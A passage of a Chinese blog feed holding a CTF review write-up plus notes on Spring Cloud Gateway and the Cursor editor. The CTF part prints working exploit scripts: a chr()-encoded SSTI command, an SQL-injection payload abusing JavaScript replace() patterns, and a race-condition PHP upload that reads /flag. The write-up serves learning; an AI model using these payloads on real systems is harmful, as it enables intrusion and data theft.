class="string">&quot;/cpass&quot;</span></span><br><span class="line">cpass_data = &#123;</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.post(host+path_cpass,data=cpass_data,proxies=proxies, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># helper.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_chr_expression</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="comment"># 使用列表推导式和ord()函数来获取每个字符的ASCII值</span></span><br><span class="line">    <span class="comment"># 然后构建所需的字符串格式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join(<span class="string">f&#x27;chr(<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>)&#x27;</span> <span class="keyword">for</span> char <span class="keyword">in</span> input_string)</span><br><span class="line">input_str=<span class="string">&quot;nl /flagf149&quot;</span></span><br><span class="line">result = string_to_chr_expression(input_str)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li></ol><h2 id="sqli-or-not-复习"><a href="#sqli-or-not-复习" class="headerlink" title="sqli or not | 复习"></a>sqli or not | 复习</h2><ol><li>代码审计，绕过逗号直接用url即可</li><li>把’”\都给过滤了要来注入应该是不行了，不支持宽字节这里(宽字节也是用于转义的，这里不符合)</li><li>结合题眼描述，从node.js切入，绕过’<ol><li><p>在json.parse()处，这里没有（可以绕过,来着），在这里就开摆了，下次不敢了</p></li><li><p>在replace()，<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#%E6%8C%87%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%9C%E4%B8%BA%E6%9B%BF%E6%8D%A2%E9%A1%B9">绕过</a></p><ol><li>这里还是要细心下来的wc，就算看到了可能也想不到啊</li><li>本地起一个看看嘻嘻</li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// npm install express</span></span><br><span class="line"><span class="comment">// node test.js</span></span><br><span class="line"><span class="comment">// test.js</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Express应用程序实例</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义路由</span></span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">info</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/\,/gi</span>)) &#123;</span><br><span class="line">            res.<span class="title function_">end</span>(<span class="string">&quot;hacker1!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> info = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">info</span>); <span class="comment">// 注意：这里存在原型污染风险</span></span><br><span class="line">        <span class="keyword">if</span> (info.<span class="property">username</span> &amp;&amp; info.<span class="property">password</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> username = info.<span class="property">username</span>;</span><br><span class="line">            <span class="keyword">var</span> password = info.<span class="property">password</span>;</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                info.<span class="property">username</span>.<span class="title function_">match</span>(<span class="regexp">/\&#x27;|\&quot;|\\/</span>) ||</span><br><span class="line">                info.<span class="property">password</span>.<span class="title function_">match</span>(<span class="regexp">/\&#x27;|\&quot;|\\/</span>)</span><br><span class="line">            ) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&quot;hacker2!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> sql =</span><br><span class="line">                <span class="string">&quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;</span>;</span><br><span class="line">            sql = sql.<span class="title function_">replace</span>(<span class="string">&quot;&#123;username&#125;&quot;</span>, username);</span><br><span class="line">            sql = sql.<span class="title function_">replace</span>(<span class="string">&quot;&#123;password&#125;&quot;</span>, password);</span><br><span class="line">            res.<span class="title function_">end</span>(sql);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">end</span>(<span class="string">&quot;please input the data&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&quot;please input the data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用路由器</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>, router);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听8081端口</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8081</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Server is running on port 8081&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://localhost:8081&quot;</span></span><br><span class="line">path_root=<span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### 1. 发送username和password</span></span><br><span class="line">inject_params=&#123;</span><br><span class="line">    <span class="comment"># json格式输入</span></span><br><span class="line">    <span class="comment"># &quot;info&quot;: &#x27;&#123;&quot;username&quot;:&quot;abc&quot;,&quot;password&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line">    <span class="string">&quot;info&quot;</span>: <span class="string">&#x27;&#123;&quot;username&quot;:&quot;$` or 1=1 --&quot;,&quot;password&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">r = session.get(host+path_root,params=inject_params,timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出，成功绕过</span></span><br><span class="line"><span class="comment"># select * from userinfo where username = &#x27;select * from userinfo where username = &#x27; or 1=1 --&#x27; and password = &#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="Rank-U-复习"><a href="#Rank-U-复习" class="headerlink" title="Rank-U | 复习"></a>Rank-U | 复习</h2><ol><li><p>看wp是随意登录？bp随便爆</p></li><li><p>上传文件无法访问，很正常的竞争思路，早知道看这题了呜呜呜，学习一下川大脚本</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># upload.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://xxx/admin/index.php&quot;</span>  <span class="comment"># 更新 URL</span></span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;bsgq3v7goubrk1ciepr0se2dfc&quot;</span>&#125;  <span class="comment"># 更新 PHP 会话 ID</span></span><br><span class="line">    </span><br><span class="line">    data = (</span><br><span class="line">        <span class="string">&quot;------WebKitFormBoundarygIbPTT5pJVbv72RS\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Content-Disposition: form-data; name=\&quot;file_upload\&quot;; filename=\&quot;yjh3.php\&quot;\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Content-Type: application/octet-stream\r\n\r\n&quot;</span></span><br><span class="line">        <span class="string">&quot;&lt;?php echo file_get_contents(&#x27;/flag&#x27;);?&gt;\r\n&quot;</span>  <span class="comment"># 改为新代码</span></span><br><span class="line">        <span class="string">&quot;------WebKitFormBoundarygIbPTT5pJVbv72RS--\r\n&quot;</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送 POST 请求，只保留 Cookie</span></span><br><span class="line">    r = requests.post(url, cookies=cookies, data=data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取文件名并保存到本地文件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        filename = r.text.split(<span class="string">&#x27;./Uploads/1f14bba00da3b75118bc8dbf8625f7d0/&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;/p&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;name.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(filename.strip())  <span class="comment"># 使用 strip() 去除可能的换行符</span></span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无法提取文件路径或文件上传失败&quot;</span>)   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># access.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url0 = <span class="string">&#x27;http://xxx/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 直接读取文件内容，去除换行符并逐行处理</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;name.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> file:</span><br><span class="line">            shellpath = url0 + filename.strip()  <span class="comment"># 使用 strip() 去除换行符</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发起 GET 请求</span></span><br><span class="line">            r1 = requests.get(shellpath)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果状态码不是 404，输出状态码和响应文本</span></span><br><span class="line">            <span class="keyword">if</span> r1.status_code != <span class="number">404</span>:</span><br><span class="line">                <span class="built_in">print</span>(r1.status_code)</span><br><span class="line">                <span class="built_in">print</span>(r1.text)</span><br></pre></td></tr></table></figure></li></ol><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><h3 id="Rank-I"><a href="#Rank-I" class="headerlink" title="Rank-I"></a>Rank-I</h3><blockquote><p>其实是很简单的ssti题目</p></blockquote><ul><li><input disabled="" type="checkbox"> fenjing</li><li><input disabled="" type="checkbox"> sh, curl, wget getshell</li><li><input disabled="" type="checkbox"> ssti</li></ul><ol><li>找到方向最重要<ol><li>fuzz测试：输入可能有ssti，xss这些</li><li>获取信息：dirsearch，报错信息，http返回头信息</li><li>方向尝试：题眼，假设评级(比如这里一开始xss想要重定向，应该想到没用的)</li></ol></li><li>黑名单绕过<ol><li>明确目的：这里其实已经确定了&#x2F;，编码+拼接了，因为chr没有跑去反弹了，但是也不行，虽然可以通外网，这里顺下去引入chr就好了</li></ol></li></ol><h3 id="sqli-or-not"><a href="#sqli-or-not" class="headerlink" title="sqli or not"></a>sqli or not</h3><blockquote><p>逻辑不难，差一点点，不过方向对了，说明还没废掉</p></blockquote><ul><li><input checked="" disabled="" type="checkbox"> node cheat sheet</li></ul><ol><li>查找特殊字符<ol><li>也可以是拼接，先想象一下在跳过</li></ol></li><li>查找资料<ol><li>现有方向最重要</li><li>wp+论坛 -&gt; 没找到(把握下没找到的度)再官方文档</li></ol></li></ol><h3 id="Rank-U"><a href="#Rank-U" class="headerlink" title="Rank-U"></a>Rank-U</h3><blockquote><p>完全没看(，看了wp感觉无话可说</p></blockquote><ul><li><input disabled="" type="checkbox"> php文件竞争上传</li></ul><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://blog.csdn.net/uuzeray/article/details/145228235">川大爷是真的nb</a></li><li><a href="https://cn-sec.com/archives/3646467.html">ssti不错</a></li><li><a href="https://blog.xmcve.com/2025/01/19/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-2025-Writeup/">清晰的一匹</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb5_SpringCloud</title>
      <link href="/2024/12/17/JavaWeb5_SpringCloud/"/>
      <url>/2024/12/17/JavaWeb5_SpringCloud/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ciscn24 BackendService(乱入</p></blockquote><h2 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h2><ol><li><strong>始于需求</strong>：服务发现（Service Discovery）是微服务架构中的一个关键概念，在一个典型的微服务环境中，应用程序被分解成多个独立的服务，每个服务都运行在不同的进程中，甚至可能位于不同的物理或虚拟服务器上。这些服务需要相互通信来完成业务逻辑<ol><li><strong>存在问题</strong>：直接硬编码服务的地址和端口不仅难以维护，也限制了系统的灵活性和可扩展性</li><li><strong>解决方案</strong>：设置服务注册中心来查找其他服务的位置，只需要寻找注册中心<ol><li>服务注册：当一个新的服务实例启动时，它会向服务注册中心注册自己的位置信息（如主机名、IP地址和端口号）</li><li>服务查找：任何想要与其他服务通信的服务都可以询问服务注册中心以获取目标服务的位置信息。服务注册中心返回一个或多个可用的服务实例列表，调用方可以选择其中的一个进行通信</li><li>具有其他功能：服务健康（在线）检查，负载均衡，K8S自动缩放</li></ol></li></ol></li></ol><h2 id="spring-cloud配置"><a href="#spring-cloud配置" class="headerlink" title="spring cloud配置"></a>spring cloud配置</h2><blockquote><p>一个实例的application.yml</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="comment"># 当前spring application的信息</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">gateway-service</span></span><br><span class="line">  <span class="comment"># 对spring cloud应用的配置</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># discovery和eureka注册中心一般是同时出现的</span></span><br><span class="line">    <span class="comment"># 启用服务发现功能，让此服务能够自动发现其他微服务</span></span><br><span class="line">    <span class="attr">discovery:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># 注册中心，需要提供url</span></span><br><span class="line">    <span class="attr">eureka:</span></span><br><span class="line">      <span class="attr">client:</span></span><br><span class="line">        <span class="attr">service-url:</span></span><br><span class="line">          <span class="attr">defaultZone:</span> <span class="string">http://localhost:8761/eureka/</span></span><br><span class="line">          </span><br><span class="line">    <span class="comment"># API网关的具体内容</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="comment"># 与上方的服务发现是集成的</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment"># 用于从服务发现中创建路由规则</span></span><br><span class="line">        <span class="attr">locator:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment"># 能够根据服务发现信息自动创建路由规则，动态刷新</span></span><br><span class="line">          <span class="attr">lower-case-service-id:</span> <span class="literal">true</span> <span class="comment"># 匹配服务id时不区分大小写</span></span><br><span class="line">      <span class="comment"># 具体路由规则，可以转发到服务目标</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">auth-service</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://auth-service</span>  <span class="comment"># 目标服务的URI，使用负载均衡前缀lb://加上服务名称</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/api/auth/**</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">team-service</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://team-service</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/api/teams/**</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">document-service</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://document-service</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/api/documents/**</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">permission-service</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://permission-service</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/api/permissions/**</span></span><br></pre></td></tr></table></figure><h2 id="RouteLocator"><a href="#RouteLocator" class="headerlink" title="RouteLocator"></a>RouteLocator</h2><ol><li><p>RouteLocator</p><ol><li>一个接口，用于定义和获取网关的<strong>路由规则</strong>，是请求转发和动态路由配置的关键a</li><li>定义路由：通过实现 RouteLocator 接口或使用其构建器（如 RouteLocatorBuilder），可以定义一系列的路由规则，这些规则决定了如何将传入的 HTTP 请求映射到不同的后端微服务<ol><li>获取路由集合：RouteLocator 的主要方法是 getRoutes()，它返回一个<code>Flux&lt;Route&gt;</code>，即一个响应式的流，其中包含了所有已定义的路由对象。每个 Route 对象代表一条具体的路由规则。</li><li>动态更新：由于 RouteLocator 返回的是一个 Flux，可以支持异步和非阻塞的操作，并且能够处理动态变化的路由配置（例如，从外部源加载路由配置）</li></ol></li></ol></li><li><p>RouteLocatorBuilder</p><ol><li>RouteLocatorBuilder是一个构建路由规则的帮助类<ol><li>builder.routes() 开始创建一组路由规则</li><li>.route(“example-route”, …) 定义了一条名为 “example-route” 的路由</li><li>.path(“&#x2F;example&#x2F;**”) 指定了该路由应匹配 &#x2F;example&#x2F; 下的所有路径</li><li>.filters(f -&gt; f.addRequestHeader(…)) 添加了一个过滤器，用于在请求转发之前向请求头添加信息</li><li>.uri(“<a href="http://example-service/">http://example-service</a>“) 指明了匹配请求的目标地址</li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> RouteLocator <span class="title function_">customRouteLocator</span><span class="params">(RouteLocatorBuilder builder)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> builder.routes() </span><br><span class="line">        .route(<span class="string">&quot;example-route&quot;</span>, r -&gt; r.path(<span class="string">&quot;/example/**&quot;</span>)</span><br><span class="line">            .filters(f -&gt; f.addRequestHeader(<span class="string">&quot;Example-Header&quot;</span>, <span class="string">&quot;exampleValue&quot;</span>))</span><br><span class="line">            .uri(<span class="string">&quot;http://example-service&quot;</span>))</span><br><span class="line">        .build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>路由顺序</strong></em></p><ol><li>Spring Cloud Gateway中，路由的顺序按照它们在 routes() 方法中定义的顺序依次检查每个路由的匹配条件。一旦某个请求与某一路由规则相匹配，它就会被<strong>立即处理，并且不会再尝试匹配后续的路由规则</strong>。因此，路由定义的顺序会影响最终的路由行为<ol><li>优先级：如果多个路由规则可能匹配同一个请求，则最先定义的那个会生效。</li><li>默认路由：通常建议将最具体或最常用的路由放在前面，而更通用的路由（如捕获所有未匹配路径的通配符路由）放在最后。</li><li>避免冲突：确保没有两个路由规则会对同一组请求产生歧义，除非想要这样的行为</li></ol></li><li>最佳实践：先具体后广泛</li></ol></li></ol><h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><blockquote><p>这里着重关注于Spring Cloud的Filter</p></blockquote><ol><li><p>for what: 和Spring的过滤器类似，cloud中的主要作用是在请求被转发到目标服务之前或响应返回给客户端之后对请求或响应进行修改、增强或处理</p><ol><li>一句话身份验证、日志记录、重写路径、添加&#x2F;修改请求头和响应头等功能(我爱ai)</li><li>预处理请求<ol><li>身份验证和授权：确保只有经过验证的用户才能访问特定资源</li><li>请求头管理：添加、修改或删除请求头信息，例如添加 API 密钥、设置 CORS 头等</li><li>请求体转换：修改或转换请求体内容，适用于需要标准化输入格式的场景</li><li>路径重写：改变原始请求路径以适应后端服务的需求</li></ol></li><li>后处理响应<ol><li>响应头管理：添加、修改或删除响应头信息，如设置缓存策略、CORS 响应头等</li><li>响应体转换：修改或转换响应体内容，例如加密响应数据或压缩响应内容</li><li>错误处理：统一处理来自不同后端服务的错误响应，提供一致的错误反馈机制</li></ol></li><li>监控和日志记录<ol><li>性能监控：记录每个请求的处理时间，帮助分析系统性能瓶颈</li><li>访问日志：记录所有进出网关的流量，便于审计和故障排查</li></ol></li><li>流量控制<ol><li>限流：限制单位时间内某个 IP 或用户的请求数量，防止滥用或攻击</li><li>熔断降级：当后端服务不可用时，快速失败并返回友好的错误信息，避免影响其他正常的服务调用</li></ol></li><li>路由选择优化<ol><li>动态路由调整：基于请求特性（如地理位置、用户类型）动态选择最合适的后端服务</li><li>负载均衡：结合 Spring Cloud LoadBalancer 实现智能的请求分发，提高系统的可用性和响应速度</li></ol></li></ol></li><li><p><strong>全局过滤器</strong></p><ol><li>应用于所有路由，通常用于实现跨切面的功能，如安全检查、日志记录等。它们在 GlobalFilter 接口中定义，并且可以在配置类中注册为 bean</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyGlobalFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="comment">// 在这里实现过滤逻辑</span></span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>路由过滤器</strong></p><ol><li>仅应用于特定路由规则中，通过 RouteLocatorBuilder 的 filters() 方法指定。它们更加细粒度地控制单个路由的行为，例如添加特定于该路由的请求头或执行路径重写<ol><li>上面讲到的spring cloud中的情况</li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.route(<span class="string">&quot;example-route&quot;</span>, r -&gt; r.path(<span class="string">&quot;/example/**&quot;</span>)</span><br><span class="line">  .filters(f -&gt; f.addRequestHeader(<span class="string">&quot;Example-Header&quot;</span>, <span class="string">&quot;exampleValue&quot;</span>))</span><br><span class="line">  .uri(<span class="string">&quot;http://example-service&quot;</span>))</span><br></pre></td></tr></table></figure></li><li><p>内置过滤器</p><ol><li>AddRequestHeader &#x2F; AddResponseHeader：向请求或响应中添加头部信息</li><li>RewritePath：根据正则表达式重写请求路径</li><li>StripPrefix：移除请求路径中的前缀部分</li><li>PreserveHostHeader：保持主机头不变，默认情况下会替换为主机的实际地址</li><li>Hystrix：集成 Hystrix 熔断器来实现容错机制</li><li>RateLimiter：基于令牌桶算法实现速率限制</li><li>RequestRateLimiter：根据请求频率限制访问速率</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cursor初体验</title>
      <link href="/2024/12/16/cursor%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
      <url>/2024/12/16/cursor%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><ol><li>ctrl+e(原ctrl+k): 在当前编辑处调用对话框</li><li>切换到chat&#x2F;composer<ol><li>composer: ctrl+i</li><li>更好用的: ctrl+shift+p+chat&#x2F;composer</li><li>退出chat&#x2F;composer: 1-2次ctrl+i</li></ol></li></ol><h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><ol><li>@codebase提醒参考项目代码</li><li>@docs提醒参考文档</li><li>settings中rule for ai可以设定全局要求</li></ol>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb4_Maven</title>
      <link href="/2024/12/12/JavaWeb4_Maven/"/>
      <url>/2024/12/12/JavaWeb4_Maven/</url>
      
